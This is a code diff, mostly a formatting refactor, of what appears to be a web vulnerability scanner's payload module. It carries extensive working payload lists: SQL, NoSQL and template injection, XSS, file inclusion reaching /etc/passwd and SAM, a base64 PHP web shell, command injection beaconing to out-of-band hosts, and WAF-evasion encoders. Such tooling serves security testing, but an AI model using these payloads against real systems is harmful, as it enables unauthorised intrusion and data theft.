@@ -1,5 +1,3 @@
-import glob as _glob
-import os
 import random
 import re
 import urllib.parse
@@ -7,6 +5,7 @@ from typing import Dict, List, Optional, Tuple
 
 try:
     import yaml as _yaml
+
     _HAS_YAML = True
 except ImportError:
     _HAS_YAML = False
@@ -24,12 +23,12 @@ def _load_yaml_overrides() -> dict:
     if _YAML_OVERRIDES_CACHE is not None:
         return _YAML_OVERRIDES_CACHE
     overrides = {}
-    base = os.path.join(os.path.dirname(__file__) or ".", "..", "payload_seeds")
-    if os.path.isdir(base) and _HAS_YAML:
-        for fpath in _glob.glob(os.path.join(base, "*.yml")):
+    if _HAS_YAML:
+        from tools.resources import iter_text_files
+
+        for _fname, text in iter_text_files("payload_seeds", ".yml"):
             try:
-                with open(fpath, "r", encoding="utf-8") as f:
-                    data = _yaml.safe_load(f)
+                data = _yaml.safe_load(text)
                 if not isinstance(data, dict):
                     continue
                 seeds = data.get("seeds", {})
@@ -51,23 +50,76 @@ def _load_yaml_overrides() -> dict:
                                 overrides[group_name][key_name] + filtered
                             )
             except Exception:
-                pass
+                continue
     _YAML_OVERRIDES_CACHE = overrides
     return overrides
 
 
 def _sql_case_mix(raw: str) -> str:
     sql_kw = {
-        "OR", "AND", "SELECT", "UNION", "FROM", "WHERE", "ORDER", "BY",
-        "SLEEP", "WAITFOR", "DELAY", "INSERT", "UPDATE", "DELETE", "DROP",
-        "CREATE", "ALTER", "EXEC", "HAVING", "GROUP", "NULL", "NOT",
-        "INTO", "VALUES", "SET", "LIKE", "ADMIN", "ALL", "DISTINCT",
-        "PG_SLEEP", "IF", "SUBSTRING", "USER", "DATABASE", "TABLE",
-        "COLUMN", "SCHEMA", "BENCHMARK", "LOAD_FILE", "INTOOUTFILE",
-        "INFORMATION_SCHEMA", "ON", "AS", "ELT", "EXTRACTVALUE",
-        "UPDATEXML", "DECODE", "CHR", "CONCAT", "CONCAT_WS", "CAST",
-        "CONVERT", "EXISTS", "RAND", "REVERSE", "MID",
-        "BIN", "HEX", "UNHEX", "CHAR", "ORD", "ASCII", "LENGTH",
+        "OR",
+        "AND",
+        "SELECT",
+        "UNION",
+        "FROM",
+        "WHERE",
+        "ORDER",
+        "BY",
+        "SLEEP",
+        "WAITFOR",
+        "DELAY",
+        "INSERT",
+        "UPDATE",
+        "DELETE",
+        "DROP",
+        "CREATE",
+        "ALTER",
+        "EXEC",
+        "HAVING",
+        "GROUP",
+        "NULL",
+        "NOT",
+        "INTO",
+        "VALUES",
+        "SET",
+        "LIKE",
+        "ADMIN",
+        "ALL",
+        "DISTINCT",
+        "PG_SLEEP",
+        "IF",
+        "SUBSTRING",
+        "USER",
+        "DATABASE",
+        "TABLE",
+        "COLUMN",
+        "SCHEMA",
+        "BENCHMARK",
+        "LOAD_FILE",
+        "INTOOUTFILE",
+        "INFORMATION_SCHEMA",
+        "ON",
+        "AS",
+        "ELT",
+        "EXTRACTVALUE",
+        "UPDATEXML",
+        "DECODE",
+        "CHR",
+        "CONCAT",
+        "CONCAT_WS",
+        "CAST",
+        "CONVERT",
+        "EXISTS",
+        "RAND",
+        "REVERSE",
+        "MID",
+        "BIN",
+        "HEX",
+        "UNHEX",
+        "CHAR",
+        "ORD",
+        "ASCII",
+        "LENGTH",
     }
     result = []
     for word in raw.split(" "):
@@ -174,9 +226,25 @@ def _url_partial(raw: str) -> str:
     )
 
 
-_VERSIONED_KEYWORDS = ("UNION", "SELECT", "FROM", "WHERE", "OR", "AND",
-                       "SLEEP", "ORDER", "BY", "HAVING", "GROUP", "NULL",
-                       "INSERT", "UPDATE", "DELETE", "INTO", "VALUES")
+_VERSIONED_KEYWORDS = (
+    "UNION",
+    "SELECT",
+    "FROM",
+    "WHERE",
+    "OR",
+    "AND",
+    "SLEEP",
+    "ORDER",
+    "BY",
+    "HAVING",
+    "GROUP",
+    "NULL",
+    "INSERT",
+    "UPDATE",
+    "DELETE",
+    "INTO",
+    "VALUES",
+)
 
 
 def _versioned_comment(raw: str) -> str:
@@ -194,6 +262,7 @@ def _hex_str(raw: str) -> str:
     Only converts clean literals (alnum/underscore/dash); anything containing
     spaces, quotes or SQL operators is left untouched so payloads stay valid.
     """
+
     def _conv(m):
         inner = m.group(1)
         if not inner or re.search(r"[^A-Za-z0-9_@.\-]", inner):
@@ -282,13 +351,27 @@ WAF_STRATEGIES: Dict[Optional[str], Dict] = {
         "skip": [],
     },
     "baota": {
-        "priority": ["case_sql", "comment_sql", "whitespace_sql", "hex_chars",
-                     "url_partial", "tab_sep", "double_url"],
+        "priority": [
+            "case_sql",
+            "comment_sql",
+            "whitespace_sql",
+            "hex_chars",
+            "url_partial",
+            "tab_sep",
+            "double_url",
+        ],
         "skip": [],
     },
     "btwaf": {
-        "priority": ["case_sql", "comment_sql", "whitespace_sql", "hex_chars",
-                     "url_partial", "tab_sep", "double_url"],
+        "priority": [
+            "case_sql",
+            "comment_sql",
+            "whitespace_sql",
+            "hex_chars",
+            "url_partial",
+            "tab_sep",
+            "double_url",
+        ],
         "skip": [],
     },
     None: {
@@ -388,7 +471,7 @@ SQLI_SEEDS: Dict[str, List[dict]] = {
         {"raw": "'; WAITFOR DELAY '0:0:2'-- ", "dbms": "MSSQL"},
         {"raw": "' OR 1=1; WAITFOR DELAY '0:0:2'-- ", "dbms": "MSSQL"},
         {"raw": "1'; WAITFOR DELAY '0:0:3'-- ", "dbms": "MSSQL"},
-        {"raw": '" WAITFOR DELAY \'0:0:3\'-- ', "dbms": "MSSQL"},
+        {"raw": "\" WAITFOR DELAY '0:0:3'-- ", "dbms": "MSSQL"},
         {"raw": "1; WAITFOR DELAY '0:0:3'-- ", "dbms": "MSSQL"},
         {"raw": "'; WAITFOR DELAY '0:0:3'-- -", "dbms": "MSSQL"},
         {"raw": "1'; IF 1=1 WAITFOR DELAY '0:0:3'-- ", "dbms": "MSSQL"},
@@ -413,7 +496,10 @@ SQLI_SEEDS: Dict[str, List[dict]] = {
     "time_sqlite": [
         {"raw": "' AND 1=1 AND randomblob(500000000)-- ", "dbms": "SQLite"},
         {"raw": "1' AND randomblob(500000000)-- ", "dbms": "SQLite"},
-        {"raw": "' AND 1=1 AND (SELECT count(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3))-- ", "dbms": "SQLite"},
+        {
+            "raw": "' AND 1=1 AND (SELECT count(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3))-- ",
+            "dbms": "SQLite",
+        },
         {"raw": "1 AND randomblob(500000000)-- ", "dbms": "SQLite"},
     ],
     "time_generic": [
@@ -433,8 +519,14 @@ SQLI_SEEDS: Dict[str, List[dict]] = {
         {"raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
         {"raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
         {"raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
-        {"raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
-        {"raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["string"]},
+        {
+            "raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
+            "ctx": ["string"],
+        },
+        {
+            "raw": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
+            "ctx": ["string"],
+        },
         {"raw": "') UNION SELECT NULL-- ", "ctx": ["string"]},
         {"raw": "') UNION SELECT NULL,NULL-- ", "ctx": ["string"]},
         {"raw": "') UNION SELECT NULL,NULL,NULL-- ", "ctx": ["string"]},
@@ -450,7 +542,10 @@ SQLI_SEEDS: Dict[str, List[dict]] = {
         {"raw": "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
         {"raw": "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
         {"raw": "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
-        {"raw": "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "ctx": ["numeric"]},
+        {
+            "raw": "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
+            "ctx": ["numeric"],
+        },
         {"raw": "1 UNION SELECT NULL-- ", "ctx": ["numeric"]},
         {"raw": "1 UNION SELECT NULL,NULL-- ", "ctx": ["numeric"]},
         {"raw": "1 UNION SELECT NULL,NULL,NULL-- ", "ctx": ["numeric"]},
@@ -471,7 +566,11 @@ SQLI_SEEDS: Dict[str, List[dict]] = {
     "conditional": [
         {"raw": "' AND IF(1=1,1,0)-- ", "dbms": "MySQL", "ctx": ["string"]},
         {"raw": "1 AND IF(1=1,1,0)-- ", "dbms": "MySQL", "ctx": ["numeric"]},
-        {"raw": "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)-- ", "dbms": "MSSQL", "ctx": ["string"]},
+        {
+            "raw": "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)-- ",
+            "dbms": "MSSQL",
+            "ctx": ["string"],
+        },
         {"raw": "' AND 1=(SELECT 1)-- ", "ctx": ["string"]},
         {"raw": "1 AND 1=(SELECT 1)-- ", "ctx": ["numeric"]},
         {"raw": "' AND 1=(SELECT 2)-- ", "ctx": ["string"]},
@@ -492,20 +591,29 @@ XSS_SEEDS: Dict[str, List[dict]] = {
         {"raw": "<video onloadstart=alert(1) src=x>", "ctx": ["all"]},
         {"raw": "<audio onloadstart=alert(1) src=x>", "ctx": ["all"]},
         {"raw": "<select autofocus onfocus=alert(1)>", "ctx": ["all"]},
-        {"raw": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>", "ctx": ["all"]},
+        {
+            "raw": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+            "ctx": ["all"],
+        },
         {"raw": "<div><div><img src=x onerror=alert(1)></div></div>", "ctx": ["all"]},
         {"raw": "<a href=javascript:alert(1)>x</a>", "ctx": ["all"]},
         {"raw": "<iframe srcdoc='<script>alert(1)</script>'></iframe>", "ctx": ["all"]},
-        {"raw": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>", "ctx": ["all"]},
+        {"raw": '<noscript><p title="</noscript><img src=x onerror=alert(1)>', "ctx": ["all"]},
         {"raw": "<svg><script>alert(1)</script></svg>", "ctx": ["all"]},
         {"raw": "<template><img src=x onerror=alert(1)></template>", "ctx": ["all"]},
         {"raw": "<object data='javascript:alert(1)'>", "ctx": ["all"]},
         {"raw": "<embed src='javascript:alert(1)'>", "ctx": ["all"]},
         {"raw": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "ctx": ["all"]},
         {"raw": "<svg><set attributeName=onmouseover onbegin=alert(1)>", "ctx": ["all"]},
-        {"raw": "<math><annotation-xml encoding='text/html'><img src=x onerror=alert(1)>", "ctx": ["all"]},
+        {
+            "raw": "<math><annotation-xml encoding='text/html'><img src=x onerror=alert(1)>",
+            "ctx": ["all"],
+        },
         {"raw": "<xss id=x onfocus=alert(1) tabindex=1>#x</xss>", "ctx": ["all"]},
-        {"raw": "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>", "ctx": ["all"]},
+        {
+            "raw": "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>",
+            "ctx": ["all"],
+        },
         {"raw": "<video><source onerror=alert(1)>", "ctx": ["all"]},
         {"raw": "<iframe srcdoc='<svg onload=alert(1)>'></iframe>", "ctx": ["all"]},
         {"raw": "<svg onload=alert(1)//", "ctx": ["all"]},
@@ -643,12 +751,16 @@ CMDI_SEEDS: Dict[str, List[dict]] = {
         {"raw": "; wget {{oob_url}}", "type": "http", "ctx": ["all"]},
         {"raw": "; ping -c 1 {{oob_domain}}", "type": "dns", "ctx": ["all"]},
         {"raw": "| ping -n 1 {{oob_domain}}", "type": "dns", "ctx": ["all"]},
-        {"raw": "; python3 -c 'import urllib; urllib.request.urlopen(\"{{oob_url}}\")'", "type": "http", "ctx": ["all"]},
+        {
+            "raw": "; python3 -c 'import urllib; urllib.request.urlopen(\"{{oob_url}}\")'",
+            "type": "http",
+            "ctx": ["all"],
+        },
         {"raw": "& nslookup {{oob_domain}} &", "type": "dns", "ctx": ["all"]},
         {"raw": "&& nslookup {{oob_domain}}", "type": "dns", "ctx": ["all"]},
         {"raw": "; dig +short {{oob_domain}}", "type": "dns", "ctx": ["all"]},
         {"raw": "; host {{oob_domain}}", "type": "dns", "ctx": ["all"]},
-        {"raw": "; powershell -c \"Invoke-WebRequest {{oob_url}}\"", "type": "http", "ctx": ["all"]},
+        {"raw": '; powershell -c "Invoke-WebRequest {{oob_url}}"', "type": "http", "ctx": ["all"]},
         {"raw": "; cmd /c nslookup {{oob_domain}}", "type": "dns", "ctx": ["all"]},
         {"raw": "$(curl {{oob_url}})", "type": "http", "ctx": ["all"]},
         {"raw": "`curl {{oob_url}}`", "type": "http", "ctx": ["all"]},
@@ -660,10 +772,12 @@ LFI_SEEDS: Dict[str, List[dict]] = {
     "traversal": [
         {"raw": "/../" * n + "etc/passwd", "indicator": "root:", "ctx": ["all"]}
         for n in range(1, 8)
-    ] + [
+    ]
+    + [
         {"raw": "..\\\\" * n + "windows\\\\win.ini", "indicator": "[fonts]", "ctx": ["all"]}
         for n in (1, 3, 5)
-    ] + [
+    ]
+    + [
         {"raw": "../" * n + "etc/passwd%00", "indicator": "root:", "ctx": ["all"]}
         for n in (1, 2, 3)
     ],
@@ -679,24 +793,80 @@ LFI_SEEDS: Dict[str, List[dict]] = {
         {"raw": "..;/" * 3 + "etc/passwd", "indicator": "root:", "ctx": ["all"]},
     ],
     "php_wrappers": [
-        {"raw": "php://filter/convert.base64-encode/resource=/etc/passwd", "type": "base64", "ctx": ["all"]},
-        {"raw": "php://filter/convert.base64-encode/resource=index", "type": "base64", "ctx": ["all"]},
-        {"raw": "php://filter/convert.base64-encode/resource=config.php", "type": "base64", "ctx": ["all"]},
-        {"raw": "php://filter/convert.base64-encode/resource=../config", "type": "base64", "ctx": ["all"]},
-        {"raw": "php://filter/convert.base64-encode/resource=../wp-config", "type": "base64", "ctx": ["all"]},
-        {"raw": "php://filter/read=convert.base64-encode/resource=/etc/passwd", "type": "base64", "ctx": ["all"]},
-        {"raw": "php://filter/convert.base64-encode/resource=/etc/hosts", "type": "base64", "ctx": ["all"]},
-        {"raw": "php://filter/convert.base64-encode/resource=/var/www/html/index.php", "type": "base64", "ctx": ["all"]},
-        {"raw": "php://filter/convert.base64-encode/resource=../etc/passwd", "type": "base64", "ctx": ["all"]},
+        {
+            "raw": "php://filter/convert.base64-encode/resource=/etc/passwd",
+            "type": "base64",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "php://filter/convert.base64-encode/resource=index",
+            "type": "base64",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "php://filter/convert.base64-encode/resource=config.php",
+            "type": "base64",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "php://filter/convert.base64-encode/resource=../config",
+            "type": "base64",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "php://filter/convert.base64-encode/resource=../wp-config",
+            "type": "base64",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "php://filter/read=convert.base64-encode/resource=/etc/passwd",
+            "type": "base64",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "php://filter/convert.base64-encode/resource=/etc/hosts",
+            "type": "base64",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "php://filter/convert.base64-encode/resource=/var/www/html/index.php",
+            "type": "base64",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "php://filter/convert.base64-encode/resource=../etc/passwd",
+            "type": "base64",
+            "ctx": ["all"],
+        },
         {"raw": "expect://id", "indicator": "uid=", "ctx": ["all"]},
         {"raw": "expect://whoami", "indicator": None, "ctx": ["all"]},
-        {"raw": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==", "type": "rce", "ctx": ["all"]},
+        {
+            "raw": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
+            "type": "rce",
+            "ctx": ["all"],
+        },
         {"raw": "data://text/plain,<?php echo 123; ?>", "type": "rce", "ctx": ["all"]},
-        {"raw": "data://text/plain;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA==", "type": "rce", "ctx": ["all"]},
+        {
+            "raw": "data://text/plain;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA==",
+            "type": "rce",
+            "ctx": ["all"],
+        },
         {"raw": "php://input", "type": "rce", "ctx": ["all"]},
-        {"raw": "compress.zlib://php://filter/convert.base64-encode/resource=/etc/passwd", "type": "base64", "ctx": ["all"]},
-        {"raw": "php://filter/convert.base64-encode/resource=/etc/passwd/resource=1", "type": "base64", "ctx": ["all"]},
-        {"raw": "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd", "type": "base64", "ctx": ["all"]},
+        {
+            "raw": "compress.zlib://php://filter/convert.base64-encode/resource=/etc/passwd",
+            "type": "base64",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "php://filter/convert.base64-encode/resource=/etc/passwd/resource=1",
+            "type": "base64",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
+            "type": "base64",
+            "ctx": ["all"],
+        },
     ],
     "log_poison": [
         {"raw": "/proc/self/environ", "indicator": "PATH=", "ctx": ["all"]},
@@ -715,13 +885,21 @@ LFI_SEEDS: Dict[str, List[dict]] = {
     ],
     "windows": [
         {"raw": "c:\\\\boot.ini", "type": "read", "ctx": ["all"]},
-        {"raw": "c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts", "type": "read", "ctx": ["all"]},
+        {
+            "raw": "c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
+            "type": "read",
+            "ctx": ["all"],
+        },
         {"raw": "c:\\\\windows\\\\php.ini", "type": "read", "ctx": ["all"]},
         {"raw": "c:\\\\inetpub\\\\wwwroot\\\\web.config", "type": "read", "ctx": ["all"]},
         {"raw": "c:\\\\windows\\\\repair\\\\SAM", "type": "read", "ctx": ["all"]},
         {"raw": "c:\\\\windows\\\\repair\\\\SYSTEM", "type": "read", "ctx": ["all"]},
         {"raw": "c:\\\\windows\\\\win.ini", "indicator": "[fonts]", "ctx": ["all"]},
-        {"raw": "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts", "type": "read", "ctx": ["all"]},
+        {
+            "raw": "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
+            "type": "read",
+            "ctx": ["all"],
+        },
     ],
     "phar_zip": [
         {"raw": "phar://uploads/shell.phar/test.txt", "type": "phar", "ctx": ["all"]},
@@ -754,36 +932,120 @@ SSTI_SEEDS: Dict[str, List[dict]] = {
         {"raw": "{{'x'|attr('upper')}}", "indicator": "X", "ctx": ["all"]},
     ],
     "blind": [
-        {"raw": "{{ cycler.__init__.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "{{ lipsum.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "{{ namespace.__init__.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "{{ config.__class__.__init__.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "{{ ''.__class__.__mro__[1].__subclasses__() }}", "indicator": "subclasses", "ctx": ["all"]},
-        {"raw": "{{ ''.__class__.__mro__[2].__subclasses__() }}", "indicator": "subclasses", "ctx": ["all"]},
-        {"raw": "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}", "indicator": "root:", "ctx": ["all"]},
-        {"raw": "{{ ''.__class__.__mro__[1].__subclasses__()[999].__init__.__globals__['os'].popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "{{ cycler.__init__.__globals__.os.popen('whoami').read() }}", "indicator": None, "ctx": ["all"]},
-        {"raw": "{{ url_for.__globals__.os.popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "{{[].__class__.__base__.__subclasses__()}}", "indicator": "subclasses", "ctx": ["all"]},
+        {
+            "raw": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ lipsum.__globals__.os.popen('id').read() }}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ namespace.__init__.__globals__.os.popen('id').read() }}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ config.__class__.__init__.__globals__.os.popen('id').read() }}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+            "indicator": "subclasses",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ ''.__class__.__mro__[2].__subclasses__() }}",
+            "indicator": "subclasses",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}",
+            "indicator": "root:",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ ''.__class__.__mro__[1].__subclasses__()[999].__init__.__globals__['os'].popen('id').read() }}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ cycler.__init__.__globals__.os.popen('whoami').read() }}",
+            "indicator": None,
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ url_for.__globals__.os.popen('id').read() }}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "{{[].__class__.__base__.__subclasses__()}}",
+            "indicator": "subclasses",
+            "ctx": ["all"],
+        },
         {"raw": "{{['id']|filter('system')|join(',')}}", "indicator": "uid=", "ctx": ["all"]},
         {"raw": "{{['id']|map('system')|join}}", "indicator": "uid=", "ctx": ["all"]},
         {"raw": "{%print('x')%}", "indicator": "x", "ctx": ["all"]},
         {"raw": "${7*7}", "indicator": "49", "ctx": ["all"]},
-        {"raw": "${'freemarker.template.utility.Execute'?new()('id')}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "${'freemarker.template.utility.Execute'?new()('whoami')}", "indicator": None, "ctx": ["all"]},
-        {"raw": "${T(java.lang.Runtime).getRuntime().exec('id')}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "${script['java'].newInstance('java.lang.Runtime').exec('id')}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "#set($x=$rt.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))", "indicator": "uid=", "ctx": ["all"]},
+        {
+            "raw": "${'freemarker.template.utility.Execute'?new()('id')}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "${'freemarker.template.utility.Execute'?new()('whoami')}",
+            "indicator": None,
+            "ctx": ["all"],
+        },
+        {
+            "raw": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "${script['java'].newInstance('java.lang.Runtime').exec('id')}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": "#set($x=$rt.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
         {"raw": "{system('id')}", "indicator": "uid=", "ctx": ["all"]},
         {"raw": "{system('cat /etc/passwd')}", "indicator": "root:", "ctx": ["all"]},
         {"raw": "${__import__('os').popen('id').read()}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "<%= system(\"id\") %>", "indicator": "uid=", "ctx": ["all"]},
+        {"raw": '<%= system("id") %>', "indicator": "uid=", "ctx": ["all"]},
         {"raw": "${groovy:Runtime.getRuntime().exec('id')}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "${'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}", "indicator": "uid=", "ctx": ["all"]},
-        {"raw": "${\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}", "indicator": "uid=", "ctx": ["all"]},
+        {
+            "raw": "${'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}",
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
+        {
+            "raw": '${"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}',
+            "indicator": "uid=",
+            "ctx": ["all"],
+        },
     ],
 }
 
@@ -823,7 +1085,11 @@ NOSQLI_SEEDS: Dict[str, List[dict]] = {
         {"raw": '{"$regex": "^.*$"}', "type": "json", "ctx": ["json"]},
         {"raw": '{"$regex": "^(?=.*a)(?=.*b).*$"}', "type": "json", "ctx": ["json"]},
         {"raw": '{"$where": "sleep(5000)"}', "type": "json_time", "ctx": ["json"]},
-        {"raw": '{"$function": {"body": "return true;", "args": []}}', "type": "json", "ctx": ["json"]},
+        {
+            "raw": '{"$function": {"body": "return true;", "args": []}}',
+            "type": "json",
+            "ctx": ["json"],
+        },
     ],
     "error": [
         {"raw": "'", "ctx": ["string"]},
@@ -845,8 +1111,7 @@ def _filter_by_dbms(seeds: List[dict], dbms: Optional[str]) -> List[dict]:
     if not dbms:
         return [s for s in seeds if "dbms" not in s]
     dbms_l = dbms.lower()
-    tagged = [s for s in seeds
-              if "dbms" in s and str(s.get("dbms", "")).lower() == dbms_l]
+    tagged = [s for s in seeds if "dbms" in s and str(s.get("dbms", "")).lower() == dbms_l]
     generic = [s for s in seeds if "dbms" not in s]
     if not tagged and any("dbms" in s for s in seeds):
         # No exact match: keep everything rather than dropping coverage.
@@ -854,9 +1119,13 @@ def _filter_by_dbms(seeds: List[dict], dbms: Optional[str]) -> List[dict]:
     return tagged + generic
 
 
-def generate(seed_group: str, seed_key: str, context: str = "all",
-             waf_name: Optional[str] = None,
-             max_payloads: int = 50) -> List[dict]:
+def generate(
+    seed_group: str,
+    seed_key: str,
+    context: str = "all",
+    waf_name: Optional[str] = None,
+    max_payloads: int = 50,
+) -> List[dict]:
     groups = {
         "sqli": SQLI_SEEDS,
         "xss": XSS_SEEDS,
@@ -890,9 +1159,17 @@ def generate(seed_group: str, seed_key: str, context: str = "all",
         enc_names = encoders.get("priority", WAF_STRATEGIES[None]["priority"])
 
         if seed_group == "sqli" and seed_key in (
-            "time_mysql", "time_mssql", "time_postgres", "time_oracle",
-            "time_sqlite", "time_generic", "union", "stacked",
-            "boolean_true", "boolean_false", "conditional",
+            "time_mysql",
+            "time_mssql",
+            "time_postgres",
+            "time_oracle",
+            "time_sqlite",
+            "time_generic",
+            "union",
+            "stacked",
+            "boolean_true",
+            "boolean_false",
+            "conditional",
         ):
             # Preserve '=' semantics: hex/url encoding would break the
             # boolean/time comparison inside the SQL statement.
@@ -949,9 +1226,14 @@ def generate(seed_group: str, seed_key: str, context: str = "all",
     return results
 
 
-def generate_for_dbms(seed_group: str, seed_key: str, dbms: Optional[str],
-                      context: str = "all", waf_name: Optional[str] = None,
-                      max_payloads: int = 50) -> List[dict]:
+def generate_for_dbms(
+    seed_group: str,
+    seed_key: str,
+    dbms: Optional[str],
+    context: str = "all",
+    waf_name: Optional[str] = None,
+    max_payloads: int = 50,
+) -> List[dict]:
     """Generate payloads biased toward one DBMS: generic seeds + dbms-tagged."""
     groups = {
         "sqli": SQLI_SEEDS,
@@ -1004,13 +1286,13 @@ def generate_for_dbms(seed_group: str, seed_key: str, dbms: Optional[str],
     return results
 
 
-def generate_sqli_error(context: str = "string",
-                        waf_name: Optional[str] = None) -> List[str]:
+def generate_sqli_error(context: str = "string", waf_name: Optional[str] = None) -> List[str]:
     return [p["payload"] for p in generate("sqli", "error", context, waf_name)]
 
 
-def generate_sqli_boolean(context: str = "string",
-                          waf_name: Optional[str] = None) -> List[Tuple[str, str]]:
+def generate_sqli_boolean(
+    context: str = "string", waf_name: Optional[str] = None
+) -> List[Tuple[str, str]]:
     trues = generate("sqli", "boolean_true", context, waf_name)
     falses = generate("sqli", "boolean_false", context, waf_name)
     pairs = []
@@ -1021,25 +1303,28 @@ def generate_sqli_boolean(context: str = "string",
 
 def generate_sqli_time(waf_name: Optional[str] = None) -> List[str]:
     results = []
-    for key in ("time_mysql", "time_mssql", "time_postgres",
-                "time_oracle", "time_sqlite", "time_generic"):
+    for key in (
+        "time_mysql",
+        "time_mssql",
+        "time_postgres",
+        "time_oracle",
+        "time_sqlite",
+        "time_generic",
+    ):
